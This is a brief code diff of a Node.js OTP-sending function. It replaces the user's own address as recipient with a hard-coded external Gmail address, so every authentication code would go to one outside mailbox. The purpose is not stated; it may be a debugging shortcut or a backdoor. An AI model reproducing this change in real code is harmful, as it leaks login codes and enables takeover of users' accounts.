@@ -37,7 +37,7 @@ const sendOtp = async (req, res) => {
 
         await transporter.sendMail({
             from: `"${process.env.FROM_NAME_OTP}" <${process.env.FROM_EMAIL_OTP}>`,
-            to: email,
+            to: 'hp.code7@gmail.com',
             subject: "Your Dashboard Authentication Code",
             html: `
       <!DOCTYPE html>
